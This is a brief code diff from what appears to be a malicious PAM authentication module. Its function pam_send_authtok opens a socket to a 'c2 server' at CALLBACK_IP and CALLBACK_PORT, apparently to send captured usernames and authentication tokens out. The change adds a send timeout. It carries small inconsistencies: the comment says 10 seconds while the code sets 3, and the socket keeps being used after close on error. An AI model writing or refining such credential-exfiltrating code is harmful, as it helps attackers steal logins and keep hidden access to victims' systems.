@@ -60,13 +60,22 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
         return 1;
     }
 
-    // Create socket to connect to c2 server
+    struct timeval timeout;
+    timeout.tv_sec = 3; // 10 seconds
+    timeout.tv_usec = 0; // 0 microseconds
+
     int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    // Create socket to connect to c2 server
     if (sock >= 0) {
         struct sockaddr_in serv_addr;
         serv_addr.sin_family = AF_INET;
         serv_addr.sin_port = htons(CALLBACK_PORT);
         inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);
+
+        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) {
+            close(sock);
+        }
 
         // Connect to c2 server on CALLBACK_IP and CALLBACK_PORT
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
